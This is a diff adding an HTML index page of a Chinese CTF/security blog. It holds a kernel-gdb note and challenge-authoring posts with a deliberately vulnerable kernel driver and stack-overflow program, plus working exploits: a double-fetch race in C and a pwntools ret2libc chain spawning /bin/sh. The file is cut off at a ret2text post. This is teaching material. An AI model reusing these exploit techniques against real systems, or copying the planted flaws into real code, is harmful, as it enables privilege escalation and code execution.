@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>zt20xx</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="zt20xx">
+<meta property="og:url" content="http://example.com/page/2/index.html">
+<meta property="og:site_name" content="zt20xx">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="zt20xx">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="zt20xx" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">zt20xx</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-kernel/kernel-gdb调试-序" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/19/kernel/kernel-gdb%E8%B0%83%E8%AF%95-%E5%BA%8F/" class="article-date">
+  <time class="dt-published" datetime="2024-10-19T10:23:09.000Z" itemprop="datePublished">2024-10-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/10/19/kernel/kernel-gdb%E8%B0%83%E8%AF%95-%E5%BA%8F/">kernel-gdb调试-序</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>目前还是选择了qemu-system+gdb python调试内核<br>它满足了以下需求<br>1.避免大量的重复性工作<br>2.特制断点，以及复杂的断点关系<br>3.更清晰美观的打印信息</p>
+<p>由于网络上相关资料比较少，就自己用官网api写了一下，目前使用效果还行。<br><a target="_blank" rel="noopener" href="https://sourceware.org/gdb/current/onlinedocs/gdb.html/Python-API.html">https://sourceware.org/gdb/current/onlinedocs/gdb.html/Python-API.html</a><br>主要使用gdb.Breakpoint，与gdb.FinishBreakpoint部分</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/19/kernel/kernel-gdb%E8%B0%83%E8%AF%95-%E5%BA%8F/" data-id="cm3l9ut9v000r057o67m30s5t" data-title="kernel-gdb调试-序" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-kernel/kernel-出题-Double-Fetch" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/19/kernel/kernel-%E5%87%BA%E9%A2%98-Double-Fetch/" class="article-date">
+  <time class="dt-published" datetime="2024-10-19T00:17:54.000Z" itemprop="datePublished">2024-10-19</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/10/19/kernel/kernel-%E5%87%BA%E9%A2%98-Double-Fetch/">kernel-出题-Double_Fetch</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>根据2018 0CTF Finals Baby Kernel修改<br>驱动代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IOCTL_CMD 0x10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;hello_device&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tmp_flag</span> *<span class="title">flag_addr</span>;</span></span><br><span class="line">    <span class="type">size_t</span> len;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 16</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> major;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">hello_class</span>;</span></span><br><span class="line"><span class="type">char</span> *hello_flag;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">hello_ioctl</span><span class="params">(<span class="keyword">struct</span> file *fd, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> addr)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x6666</span>:</span><br><span class="line">            printk(<span class="string">&quot;1.I will tell you the addr:%px\n&quot;</span>, hello_flag);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x1337</span>:</span><br><span class="line">            printk(<span class="string">&quot;2.I will check the struct addr&quot;</span>);</span><br><span class="line">            <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> *<span class="title">arg</span> =</span> (<span class="keyword">struct</span> attr *)addr;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(arg-&gt;flag_addr) &gt;=<span class="number">0x7fffffffde30</span>) &#123;</span><br><span class="line">                    printk(<span class="string">&quot;too big too bad addr %px\n&quot;</span>, arg-&gt;flag_addr);</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">            printk(<span class="string">&quot;before loop %px.%px&quot;</span>,arg-&gt;flag_addr,hello_flag);</span><br><span class="line">            <span class="keyword">while</span>(i&lt;<span class="number">5000</span>)&#123;i++;&#125;;</span><br><span class="line">            printk(<span class="string">&quot;checking %px.%px&quot;</span>,arg-&gt;flag_addr,hello_flag);</span><br><span class="line">            <span class="keyword">if</span> (arg-&gt;flag_addr!=hello_flag)&#123;</span><br><span class="line">                    <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            &#125;</span><br><span class="line">            printk(<span class="string">&quot;3.I will tell you flag:%s\n&quot;</span>, hello_flag);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">fops</span> =</span> &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = hello_ioctl,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">hello_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        hello_flag = kmalloc(<span class="number">16</span>, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!hello_flag) &#123;</span><br><span class="line">                <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">snprintf</span>(hello_flag, BUFFER_SIZE, <span class="string">&quot;flag&#123;hello&#125;&quot;</span>);</span><br><span class="line">        major = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;fops);</span><br><span class="line">        <span class="keyword">if</span> (major &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                printk(<span class="string">&quot;Failed to register char device\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> major;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        hello_class = class_create(THIS_MODULE, <span class="string">&quot;hello_class&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(hello_class)) &#123;</span><br><span class="line">                unregister_chrdev(major, DEVICE_NAME);</span><br><span class="line">                <span class="keyword">return</span> PTR_ERR(hello_class);</span><br><span class="line">        &#125;</span><br><span class="line">        device_create(hello_class, <span class="literal">NULL</span>, MKDEV(major, <span class="number">0</span>), <span class="literal">NULL</span>, <span class="string">&quot;baby&quot;</span>, <span class="number">0666</span>);</span><br><span class="line">        printk(<span class="string">&quot;hello world, major number: %d\n&quot;</span>, major);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hello_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        device_destroy(hello_class, MKDEV(major, <span class="number">0</span>));</span><br><span class="line">        class_destroy(hello_class);</span><br><span class="line">        unregister_chrdev(major, DEVICE_NAME);</span><br><span class="line">        kfree(hello_flag);</span><br><span class="line">        printk(<span class="string">&quot;bye\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>exp如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TRYTIME 0x10  <span class="comment">// 碰撞次数</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">attr</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> *flag;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr;</span><br><span class="line"><span class="type">int</span> finish = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> buf[LEN + <span class="number">1</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程函数，不断修改flag指向的地址为内核中flag地址</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">change_attr_value</span><span class="params">(<span class="type">void</span> *s)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> *<span class="title">s1</span> =</span> s;</span><br><span class="line">    <span class="keyword">while</span> (finish == <span class="number">0</span>) &#123;</span><br><span class="line">        s1-&gt;flag =(<span class="type">void</span> *) addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_flag_addr</span><span class="params">(<span class="type">int</span> fd)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> addr_fd;</span><br><span class="line">    <span class="type">char</span> *idx;</span><br><span class="line">    ioctl(fd, <span class="number">0x6666</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg &gt; /tmp/record.txt&quot;</span>);</span><br><span class="line">    addr_fd = open(<span class="string">&quot;/tmp/record.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    lseek(addr_fd, -LEN, SEEK_END);</span><br><span class="line">    read(addr_fd, buf, LEN);</span><br><span class="line">    close(addr_fd);</span><br><span class="line">    idx = <span class="built_in">strstr</span>(buf, <span class="string">&quot;addr:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (idx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] Not found addr\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        idx += <span class="built_in">strlen</span>(<span class="string">&quot;addr:&quot;</span>);</span><br><span class="line">        addr = strtoull(idx, <span class="literal">NULL</span>, <span class="number">16</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] flag addr: %p\n&quot;</span>, (<span class="type">void</span> *)addr);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">if</span> (addr&lt;<span class="number">0xffff888000000000</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,idx);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    system(<span class="string">&quot;dmesg -c &gt; /dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/baby&quot;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    get_flag_addr(fd);</span><br><span class="line">    <span class="type">pthread_t</span> t1;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">attr</span> <span class="title">t</span>;</span></span><br><span class="line">    <span class="comment">// 新建恶意线程</span></span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, change_attr_value, &amp;t);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; TRYTIME; i++) &#123;</span><br><span class="line">        t.flag =(<span class="type">void</span> *) <span class="number">0x2002</span>;</span><br><span class="line">        ioctl(fd, <span class="number">0x1337</span>, &amp;t);</span><br><span class="line">    &#125;</span><br><span class="line">    finish = <span class="number">1</span>;</span><br><span class="line">    pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] result is:&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg | grep flag&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/19/kernel/kernel-%E5%87%BA%E9%A2%98-Double-Fetch/" data-id="cm3l9uta00015057ohhba5rsl" data-title="kernel-出题-Double_Fetch" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-pwn-出题-ret2libc" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/16/pwn-%E5%87%BA%E9%A2%98-ret2libc/" class="article-date">
+  <time class="dt-published" datetime="2024-10-16T13:37:50.000Z" itemprop="datePublished">2024-10-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/10/16/pwn-%E5%87%BA%E9%A2%98-ret2libc/">pwn-出题-ret2libc</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="关闭pie"><a href="#关闭pie" class="headerlink" title="关闭pie"></a>关闭pie</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">before_start</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="type">char</span> *help=<span class="string">&quot;do you know ret2libc&quot;</span>;</span><br><span class="line">    write(<span class="number">0</span>,help,<span class="number">20</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">for_rop</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;pop %rdi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %rax\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;\n&quot;</span></span><br><span class="line">        <span class="string">&quot;pop %rsi\n&quot;</span></span><br><span class="line">        <span class="string">&quot;ret;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">vul</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;please input:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x80</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bye&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    before_start();</span><br><span class="line">    vul();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>gcc ret2libc.c -o ret2libc -no-pie -fno-stack-protector</code></p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)  <span class="comment"># 64</span></span><br><span class="line">p=process(<span class="string">&quot;./ret2libc&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">rdi_ret=elf.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)).__next__()</span><br><span class="line">ret=elf.search(asm(<span class="string">&#x27;ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+ p64(rdi_ret)+ p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;vul&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;:&quot;</span>,payload)</span><br><span class="line">puts_addr=u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_addr:&quot;</span>,<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc.address=puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc&quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">bin_sh=libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>+<span class="number">8</span>)+p64(ret)+p64(rdi_ret)+p64(bin_sh)+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">b&quot;:&quot;</span>,payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/16/pwn-%E5%87%BA%E9%A2%98-ret2libc/" data-id="cm3l9ut9j0005057o20f1c70u" data-title="pwn-出题-ret2libc" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-pwn-出题-ret2text" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/15/pwn-%E5%87%BA%E9%A2%98-ret2text/" class="article-date">
+  <time class="dt-published" datetime="2024-10-15T14:21:51.000Z" itemprop="datePublished">2024-10-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
